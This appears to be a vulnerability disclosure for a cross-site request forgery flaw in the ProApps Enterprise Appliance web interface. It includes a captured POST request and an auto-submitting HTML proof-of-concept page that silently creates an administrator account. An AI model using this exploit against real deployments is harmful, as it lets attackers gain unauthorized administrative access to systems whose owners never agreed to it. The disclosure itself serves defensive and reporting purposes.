# Description Item:
```
Product Vendor: freebsdbrasil
Item: ProApps - Enterprise Appliance
Editor Creator: DreamWeaver
PHP: PHP Version 7.3.18 
Java Script Library: Jquery UI 1.6 | Jquery 1.2.6
Server: NGINX
Operational System: FreeBDS Unix
```

## Vulnerability Type:
Cross-Site Request Forgery (CSRF)

## Description Vulnerability:
CSRF can cause lot of consequences, depending on how the CSRF request is crafted and the application's behavior. In this case, it is a CSRF vulnerability that allows the creation of an administrative account on the web application, resulting in unauthorized access. To exploit a CSRF, the victim needs to be authenticated and have the "Users" management permission set to "Modified" (True).

## Exploitation:
Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

As mentioned before, when an authenticated user clicks on the link, the malicious code will send a request to create a new user by the user's web browser. The code below creates a new administrative account in the vulnerable web application with the username `CSRF_POC` and the password `yourpassword`.
The code sends a crafted POST request to the `ger_user page` page with the parameters `login`, `password`, `password2`, `nome`, `gid` and `email` fields. It is important to mention that this page is responsible for creating new users or changing their passwords. Filling the other parameters is optional; all the important ones are already completed and ready to use. The code below shows the POST request:

```
POST /index.php?page=ger_user HTTP/1.1
Host: vulnerablewebsite
Content-Length: 402
Cache-Control: max-age=0
Authorization: XXXXXXXXXXXXXXXXXXXXXXXXXXXX
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://XXXXXXXX
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://vulnerablesite/index.php?page=ger_user
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

task=save&boxchecked=0&hidemainmenu=0&search=&dados%5Bid%5D=&dados%5Bnome%5D=Teste+Blaze&dados%5Blogin%5D=athos_teste&dados%5Bemail%5D=test%40hotmail.com&dados%5Bgid%5D=2&dados%5Bpassword%5D=test123456&dados%5Bpassword2%5D=test123456&dados%5Bblock%5D=0&dados%5Bblock2%5D=1&dados%5Btotp2fa%5D=0&dados%5Btotp2fa_test%5D=&dados%5Btotp2fa_key%5D=4b818698b94ffb5e92377024f060d531&id=&option=ger_user
```


The code below is creating a new administrative account on the web application.
NOTE: Leave the `gid` parameter is set to 1 to ensure that the account will have administrative permissions, however, it can be changed depending on how the environment is configured.

```
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send CSRF-POST Request</title>
</head>
<body>
    <form action="https://vulnerablesite.com/index.php?page=ger_user" method="POST">
        <!-- Campos do formulário -->
        <input type="hidden" name="task" value="save">
        <input type="hidden" name="boxchecked" value="0">
        <input type="hidden" name="hidemainmenu" value="0">
        <input type="hidden" name="search" value="">

        <input type="hidden" name="dados[id]" value="">
        <input type="hidden" name="dados[nome]" value="POC_CSRF">
        <input type="hidden" name="dados[login]" value="csrf_account">
        <input type="hidden" name="dados[email]" value="csfr@test.com">
        <input type="hidden" name="dados[gid]" value="1">
        <input type="hidden" name="dados[password]" value="yourpassword">
        <input type="hidden" name="dados[password2]" value="yourpassword">
        <input type="hidden" name="dados[block]" value="0">
        <input type="hidden" name="dados[block2]" value="0">
        <input type="hidden" name="dados[totp2fa]" value="0">
        <input type="hidden" name="dados[totp2fa_test]" value="">
        <input type="hidden" name="dados[totp2fa_key]" value="xxxxx">
        <input type="hidden" name="id" value="">
        <input type="hidden" name="option" value="ger_user">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```
Once exploited, it is now possible to log into the application and obtain unauthorized access.

## Impact Vulnerability:
CSRF Cross-Site Request Forgery allows creation of an administrative account or account hijacking.

### References:
- https://portswigger.net/web-security/csrf
- https://owasp.org/www-community/attacks/csrf
- https://www.linkedin.com/pulse/from-csrf-account-takeover-unmasking-danger-cross-site-request-lylbf/

